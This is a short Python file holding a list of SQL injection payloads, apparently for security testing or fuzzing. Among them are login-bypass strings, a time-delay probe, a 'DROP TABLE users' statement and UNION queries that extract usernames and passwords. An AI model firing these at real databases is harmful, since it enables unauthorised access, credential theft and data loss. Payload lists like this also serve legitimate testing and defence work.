# payloads.py

payloads = [
    "' OR '1'='1",
    "' OR '1'='1' -- ",
    "' OR 1=1--",
    "' OR 1=1#",
    "' OR 1=1/*",
    "'; DROP TABLE users; --",
    "' OR 'a'='a",
    "' OR 1=1 LIMIT 1 --",
    "\" OR \"1\"=\"1",
    "\" OR 1=1--",
    "' OR sleep(5)--",
    "' OR 'x'='x",
    "' OR EXISTS(SELECT * FROM users)--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' AND 1=0 UNION SELECT username,password FROM users--",
]
